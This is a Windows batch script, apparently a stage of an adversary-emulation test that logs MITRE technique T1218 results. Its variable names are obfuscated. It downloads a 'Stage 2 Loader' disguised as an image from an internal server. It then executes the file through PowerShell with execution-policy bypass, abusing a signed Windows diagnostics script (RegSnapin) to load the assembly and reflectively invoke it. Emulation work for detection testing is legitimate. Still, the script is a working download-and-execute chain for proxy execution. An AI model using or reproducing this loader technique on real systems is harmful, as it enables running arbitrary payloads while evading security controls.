@echo off
setlocal enabledelayedexpansion

REM Cache timestamp for debug logs
SET tsvar=!DATE!/!TIME!

REM Random-named SET variables for every PHR placeholder (excluding %APPDATA%\7\macula-simulations.log)
SET a1b2c3=%APPDATA%\10412\c150fad4
SET d4e5f6=48fce3af.txt
SET g7h8i9=https://10.0.0.49/stage/2/icon.png?10412-7
SET j0k1l2=ITZEL-S2B
SET m3n4o5=10412
SET p6q7r8=7

REM Log file path (constructed using endpoint ID)
SET "logfile=%APPDATA%\!p6q7r8!\macula-simulations.log"

REM === Step 2: Heartbeat fetch (downloads Stage 2 Loader) ===
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!a1b2c3!\!d4e5f6!" "!g7h8i9!"
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: heartbeat_complete>> "!logfile!" 2>nul

REM === Step 3: Change directory to Loader location ===
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: chdir_start>> "!logfile!" 2>nul
cd /d "!a1b2c3!" >nul 2>&1
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: chdir_result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM === Step 4: Execute Stage 2 Loader via LOLBIN (PowerShell) ===
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: powershell_start>> "!logfile!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin %APPDATA%\10412\c150fad4\\48fce3af.txt; $a=[AppDomain]::CurrentDomain.GetAssemblies()|Select -Last 1; ($a.GetExportedTypes()|%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null)"
SET "ps_exitcode=!ERRORLEVEL!"
echo [!tsvar!][DEBUG][!j0k1l2!][!m3n4o5!]: powershell_complete=!ps_exitcode!>> "!logfile!" 2>nul

REM === Step 5: Log TTP result (T1218) ===
if !ps_exitcode! equ 0 (
    echo [!tsvar!][TTP][!j0k1l2!][!m3n4o5!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!logfile!" 2>nul
) else (
    echo [!tsvar!][TTP][!j0k1l2!][!m3n4o5!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "!logfile!" 2>nul
)

exit /b 0